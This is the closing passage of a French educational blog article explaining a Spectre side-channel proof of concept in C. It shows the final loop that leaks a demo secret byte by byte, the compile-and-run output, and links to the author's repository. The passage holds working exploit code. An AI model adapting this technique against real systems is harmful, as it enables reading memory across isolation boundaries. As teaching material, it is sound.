        }
    }
}

int main(void) {
    for (int i = 0; i < sizeof(paged_buffer); i++) {
        paged_buffer[i] = 1; /* Permet d'éviter une optimisation appelée lazy allocation */
    }

    int len = 7;

    /*
     * L'index qu'on passe en argument sera utilisé de la manière suivante :
     * paged_buffer[buffer[idx] * PAGE_SIZE];
     * J'ai rappelé dans l'article sur meltdown et spectre que
     * buffer[idx]
     * était équivalent à
     * *(buffer + idx)
     * Donc pour accéder à l'adresse du premier octet de secret, on cherche
     * secret = buffer + idx
     * donc idx = secret - buffer
     * D'où le choix de l'argument dans l'instruction suivante.
     *
     * Le compteur est incrémenté pour avoir tous les octets du secret
     */
    for (int i=0; i<len; i++) {
        get_all_access_time(secret - (char * ) buffer + i);    
    }
    printf("\n");
    return 0;
}
```

Ce PoC final permet de récupérer la valeur complète du secret. En effet, en l'exécutant, voilà le secret tant attendu :

```
pixis@hackndo:~/spectre$ gcc -O0 poc_final.c -o poc_final && ./poc_final
SECRET
```

Vous trouverez tous les codes sources sur [mon github](https://github.com/Hackndo/spectre-poc){:target="blank"}.

J'espère que cet article vous aide à y voir encore plus clair. Comme d'habitude, n'hésitez pas à commenter ou à me retrouver sur [Discord](https://discord.hackndo.com){:target="blank"} pour plus d'informations, des remarques, des corrections, etc.

Je tenais à remercier [Gynvael](https://twitter.com/gynvael){:target="blank"} pour le [live](https://www.youtube.com/watch?v=0o6MoJ2gHHI){:target="blank"} qu'il a fait sur le sujet, me permettant de combler les trous manquant afin de terminer cet article.
